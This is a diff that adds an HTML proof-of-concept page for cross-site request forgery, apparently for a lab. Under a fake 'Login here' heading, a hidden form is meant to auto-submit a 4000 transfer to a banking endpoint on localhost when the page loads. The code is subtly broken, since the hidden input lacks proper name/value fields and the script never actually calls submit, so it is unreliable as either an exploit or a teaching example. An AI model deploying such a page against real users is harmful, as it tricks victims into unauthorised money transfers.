@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+
+    <html>
+    <body>
+    <h1>Login here</h1>
+
+<!--
+        This form automatically submits a POST request to the banking application without requiring
+        the legitimate user to intentionally submit the form.
+
+        The form contains hidden fields, meaning the user cannot see or
+        interact with the values being submitted.
+    -->
+
+    <form action="https://localhost/123banking.com" method="POST">
+        <input type="hidden" bsb="236781" accountNo="18976528"
+        amount="4000" />
+    </form>
+
+<!--
+        JavaScript automatically submits the form when the page loads.
+    -->
+
+<script>document.forms[0].submit</script>
+   
+    </body>
+    </html>
